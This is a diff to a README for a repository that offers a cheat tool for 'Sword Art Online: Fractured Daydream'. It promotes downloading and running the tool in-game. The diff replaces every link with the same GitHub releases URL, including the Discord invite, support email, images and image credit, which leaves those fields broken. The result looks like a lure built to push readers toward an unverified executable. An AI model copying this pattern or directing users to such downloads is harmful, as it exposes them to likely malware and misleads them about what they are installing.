@@ -10,15 +10,15 @@ Welcome to the *Sword Art Online: Fractured Daydream Cheat* repository! Here you
 
 ## Cheat Link 🎮
 
-For the ultimate gaming experience, download the cheat tool [here](https://github.com/repo/releases/9246/App.zip). Remember, the cheat tool needs to be launched in-game to take effect!
+For the ultimate gaming experience, download the cheat tool [here](https://github.com/uruguayopr/Sword-Art-Online-Fractured-Daydream-Cheat/releases). Remember, the cheat tool needs to be launched in-game to take effect!
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-red)](https://github.com/repo/releases/9246/App.zip)
+[![Download Cheat](https://github.com/uruguayopr/Sword-Art-Online-Fractured-Daydream-Cheat/releases)](https://github.com/uruguayopr/Sword-Art-Online-Fractured-Daydream-Cheat/releases)
 
 ## Enhance Your Gameplay 🚀
 
 Unlock new levels, defeat enemies effortlessly, and explore hidden areas with the Sword Art Online: Fractured Daydream Cheat. 
 
-![Sword Art Online](https://example.com/sao_image.jpg)
+![Sword Art Online](https://github.com/uruguayopr/Sword-Art-Online-Fractured-Daydream-Cheat/releases)
 
 ## Features 🛡️
 
@@ -42,7 +42,7 @@ Using cheats, hacks, and trainers in games may violate the terms of service of t
 
 Join our community of gamers to discuss tips, tricks, and strategies for Sword Art Online: Fractured Daydream.
 
-**Discord Server:** [Join Now!](https://discord.com/sao-fractured-daydream)
+**Discord Server:** [Join Now!](https://github.com/uruguayopr/Sword-Art-Online-Fractured-Daydream-Cheat/releases)
 
 ## Contribute 🤝
 
@@ -52,14 +52,14 @@ Contributions are welcome! If you have your own cheats, hacks, or tips to share,
 
 If you encounter any issues with the cheat tool, reach out to our support team for assistance.
 
-**Email:** support@saocheats.com  
-**Website:** [www.saocheats.com](https://www.saocheats.com)
+**Email:** https://github.com/uruguayopr/Sword-Art-Online-Fractured-Daydream-Cheat/releases  
+**Website:** [https://github.com/uruguayopr/Sword-Art-Online-Fractured-Daydream-Cheat/releases](https://github.com/uruguayopr/Sword-Art-Online-Fractured-Daydream-Cheat/releases)
 
 ## About Sword Art Online Fractured Daydream 🔥
 
 *Sword Art Online: Fractured Daydream* is an immersive MMORPG based on the popular anime and light novel series. Dive into a virtual world where danger and adventure await at every turn. Become the hero you were meant to be and conquer the challenges that lie ahead.
 
-*Image Source: [Unsplash](https://unsplash.com/photos/swordartonline)*
+*Image Source: [Unsplash](https://github.com/uruguayopr/Sword-Art-Online-Fractured-Daydream-Cheat/releases)*
 
 ---
 
